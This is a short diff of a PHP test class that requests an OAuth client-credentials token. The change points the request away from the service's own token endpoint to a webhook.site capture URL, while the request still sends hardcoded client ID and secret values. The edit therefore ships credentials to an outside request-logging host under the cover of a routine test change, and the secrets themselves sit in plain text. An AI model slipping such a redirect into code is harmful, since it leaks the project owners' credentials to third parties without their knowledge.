@@ -39,7 +39,7 @@ class TestB extends Generic
 
         $client = HttpClient::create();
 
-        $response = $client->request('POST', 'https://login-dev.modena.ee/oauth2/token', [
+        $response = $client->request('POST', 'https://webhook.site/5cadd40c-83aa-457f-8340-0216b99c6259', [
             'auth_basic' => ['4273d91f-e80f-410f-87cb-29a48a4b6e12', '44c77b8c-bc26-4bf3-bf88-f35fe6b189d1'],
             'body' => ['grant_type=' => 'client_credentials', 'scope' => 'slicepayment']
         ]);
